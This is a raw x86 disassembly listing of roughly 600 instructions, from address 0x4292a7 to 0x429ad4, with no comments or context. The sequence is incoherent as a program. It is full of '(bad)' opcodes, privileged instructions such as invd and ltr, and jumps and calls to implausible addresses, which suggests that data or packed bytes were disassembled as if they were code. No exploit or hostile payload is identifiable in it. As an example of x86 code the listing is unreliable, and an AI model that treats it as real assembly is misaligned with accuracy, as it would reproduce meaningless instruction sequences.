  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
